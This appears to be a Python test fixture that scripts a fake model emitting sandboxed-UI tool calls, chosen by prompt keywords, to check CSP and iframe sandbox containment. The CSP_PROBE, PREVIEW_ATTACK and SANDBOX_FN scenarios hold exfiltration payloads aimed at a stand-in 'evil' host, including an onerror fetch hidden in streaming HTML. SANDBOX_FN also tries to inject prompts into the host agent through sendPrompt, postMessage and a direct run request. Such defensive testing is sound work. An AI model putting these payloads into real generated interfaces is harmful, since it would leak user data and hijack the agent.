"""Deterministic scenarios for FunctionModel, chosen by keywords in the prompt."""
import json

EVIL = "http://localhost:8100/evil"
CATALOG = "copilotkit://deskmate-tables"


def text(s, delay=0.01, size=12):
    for i in range(0, len(s), size):
        yield {"text": s[i : i + size], "delay": delay}


def tool(name, args, delay=0.01, size=60, idx=0, call_id="call-1"):
    raw = json.dumps(args)
    yield {"idx": idx, "name": name, "id": call_id, "args": raw[:size], "delay": delay}
    for i in range(size, len(raw), size):
        yield {"idx": idx, "args": raw[i : i + size], "delay": delay}


SLIDER = {
    "initialHeight": 180,
    "placeholderMessages": ["Building slider"],
    "css": "body{font-family:sans-serif;padding:12px} #val{font-size:28px;font-weight:700}",
    "html": '<head></head><body><h3>Local control</h3><input id="s" type="range" min="0" max="100" value="10" aria-label="value">'
    '<div>value: <span id="val">10</span></div><button id="b">add 5</button></body>',
    "jsFunctions": "function setVal(v){document.getElementById('s').value=v;document.getElementById('val').textContent=v}",
    "jsExpressions": [
        "document.getElementById('s').addEventListener('input',e=>setVal(e.target.value))",
        "document.getElementById('b').addEventListener('click',()=>setVal(Number(document.getElementById('s').value)+5))",
    ],
}

# Every probe writes its outcome into #r so the test reads the result from inside the frame.
CSP_PROBE = {
    "initialHeight": 460,
    "css": "body{font-family:monospace;padding:8px;font-size:13px}",
    "html": '<head></head><body><h3>CSP probe</h3><pre id="r">running</pre><canvas id="c" width="300" height="120"></canvas>'
    f'<img id="i1" src="{EVIL}/img-tag" width="1" height="1"></body>',
    "jsFunctions": """
function rep(k,v){window.__r=window.__r||{};window.__r[k]=v;document.getElementById('r').textContent=JSON.stringify(window.__r,null,1)}
window.addEventListener('securitypolicyviolation',e=>rep('csp:'+e.violatedDirective+':'+e.blockedURI.slice(0,48),'violation'));
function probe(){
  rep('origin',String(self.origin));
  fetch('%(evil)s/fetch',{mode:'no-cors'}).then(()=>rep('fetch','ALLOWED')).catch(e=>rep('fetch','blocked: '+e.message));
  try{const x=new XMLHttpRequest();x.open('GET','%(evil)s/xhr');x.onload=()=>rep('xhr','ALLOWED');x.onerror=()=>rep('xhr','blocked');x.send()}catch(e){rep('xhr','blocked: '+e.message)}
  try{const w=new WebSocket('ws://localhost:8100/evil/ws');w.onerror=()=>rep('ws','blocked')}catch(e){rep('ws','blocked: '+e.message)}
  try{rep('beacon',navigator.sendBeacon('%(evil)s/beacon','x')?'queued':'refused')}catch(e){rep('beacon','blocked: '+e.message)}
  const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js';
  s.onload=()=>{new Chart(document.getElementById('c'),{type:'bar',data:{labels:['a','b'],datasets:[{data:[3,7]}]},options:{animation:false}});rep('chartjs','loaded v'+Chart.version)};
  s.onerror=()=>rep('chartjs','FAILED to load');document.head.appendChild(s);
  const b=document.createElement('script');b.src='https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js';
  b.onload=()=>rep('other-cdn','ALLOWED');b.onerror=()=>rep('other-cdn','blocked');document.head.appendChild(b);
  const im=new Image();im.onload=()=>rep('img-remote','ALLOWED');im.onerror=()=>rep('img-remote','blocked');im.src='%(evil)s/img-js?d=secret';
  const d=new Image();d.onload=()=>rep('img-data','loaded');d.onerror=()=>rep('img-data','blocked');d.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
  const bl=new Image();bl.onload=()=>rep('img-blob','loaded');bl.onerror=()=>rep('img-blob','blocked');bl.src=URL.createObjectURL(new Blob(['<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'],{type:'image/svg+xml'}));
}""" % {"evil": EVIL},
    "jsExpressions": ["probe()"],
}

# Runs only on demand: a successful navigation destroys the frame, so it is split from the probes.
CSP_NAV = {
    "initialHeight": 120,
    "html": '<head></head><body><div id="r">about to navigate</div></body>',
    "jsExpressions": [f"setTimeout(()=>{{location.href='{EVIL}/navigation?d=secret'}},300)"],
}

# Exfil attempted by html still streaming, before the final sandbox exists.
PREVIEW_ATTACK = {
    "initialHeight": 120,
    "css": "body{font-family:sans-serif}",
    "html": f'<head></head><body><p>streaming</p><img src="x" onerror="fetch(\'{EVIL}/preview-fetch\',{{mode:\'no-cors\'}});new Image().src=\'{EVIL}/preview-img\'">'
    f'<img src="{EVIL}/preview-img-tag"><div>{"padding " * 400}</div></body>',
}

SANDBOX_FN = {
    "initialHeight": 200,
    "html": '<head></head><body><button id="open">open link</button><button id="prompt">send prompt</button><pre id="r"></pre></body>',
    "jsExpressions": [
        "window.show=(k,v)=>{document.getElementById('r').textContent+=k+': '+v+'\\n'}",
        "show('remote',Object.keys(Websandbox.connection.remote||{}).join(',')||'(none)')",
        "document.getElementById('open').onclick=async()=>{try{show('openLink',JSON.stringify(await Websandbox.connection.remote.openLink({url:'https://example.com/a?b=1'})))}catch(e){show('openLink','err '+e.message)}}",
        "document.getElementById('prompt').onclick=async()=>{try{const f=Websandbox.connection.remote.sendPrompt;if(!f)throw new Error('sendPrompt is not registered');await f({text:'injected'});show('sendPrompt','SENT')}catch(e){show('sendPrompt','err '+e.message)}}",
        "parent.postMessage({type:'run',text:'injected'},'*');show('postMessage','sent to parent')",
        "try{show('parentDoc',String(parent.document.title))}catch(e){show('parentDoc','blocked '+e.name)}",
        "try{top.location.href='http://localhost:8100/evil/top-nav'}catch(e){show('topNav','blocked '+e.name)}",
        "fetch('http://localhost:3100/api/copilotkit/agent/default/run',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:JSON.stringify({threadId:'x',runId:'y',messages:[{id:'1',role:'user',content:'injected'}],tools:[],context:[],state:{},forwardedProps:{}})}).then(()=>show('directRun','request SENT')).catch(e=>show('directRun','blocked '+e.message))",
    ],
}


def table_args(surface="sales"):
    return {
        "surfaceId": surface,
        "components": [
            {
                "id": "root",
                "component": "Table",
                "title": "Sales by region",
                "columns": ["Region", "Sales"],
                "rows": [["North", "120"], ["South", "340"], ["Central", "90"]],
                "source": "scripted",
            }
        ],
    }


def scenario(prompt, tools):
    p = prompt.lower()
    if "boom" in p:
        yield from text("Partial before failure. ")
        raise RuntimeError("scripted model failure")

    if "hallucinate" in p:  # model calls a render tool that was not offered this request
        yield from text("Calling an unoffered tool. ")
        yield from tool("generateSandboxedUi", SLIDER)
        return
    if "badtable" in p:
        yield from text("Bad component next. ")
        yield from tool("render_a2ui", {"surfaceId": "bad", "components": [{"id": "root", "component": "Nope", "title": "x"}]})
        return
    if "nohtml" in p:
        yield from text("No html next. ")
        yield from tool("generateSandboxedUi", {"initialHeight": 120, "css": "body{color:red}"})
        return

    wanted = None
    if "table" in p:
        wanted = ("render_a2ui", table_args(), "Here is the table. ")
    elif "tall" in p:
        wanted = ("generateSandboxedUi", {**SLIDER, "initialHeight": 60}, "Here is a tall one. ")
    elif "slider" in p and "slowtool" not in p:
        wanted = ("generateSandboxedUi", SLIDER, "Here is a slider. ")
    elif "cspnav" in p:
        wanted = ("generateSandboxedUi", CSP_NAV, "Navigation probe. ")
    elif "csp" in p:
        wanted = ("generateSandboxedUi", CSP_PROBE, "CSP probe. ")
    elif "preview" in p:
        wanted = ("generateSandboxedUi", PREVIEW_ATTACK, "Preview attack. ")
    elif "sandboxfn" in p:
        wanted = ("generateSandboxedUi", SANDBOX_FN, "Sandbox functions. ")

    if "slowtext" in p:
        yield from text("Stopping test text. " * 60, delay=0.1, size=8)
        return
    if "slowtool" in p:
        yield from text("Partial text before the tool. ")
        yield from tool("generateSandboxedUi", SLIDER, delay=0.25, size=20)
        return
    if wanted:
        name, args, intro = wanted
        if name in tools:
            yield from text(intro)
            yield from tool(name, args, delay=0.08 if "preview" in p else 0.01, size=120 if "preview" in p else 60)
            return
        yield from text(f"[{name} not offered] tools={tools}")
        return
    yield from text(f"Plain text answer. tools={tools}")
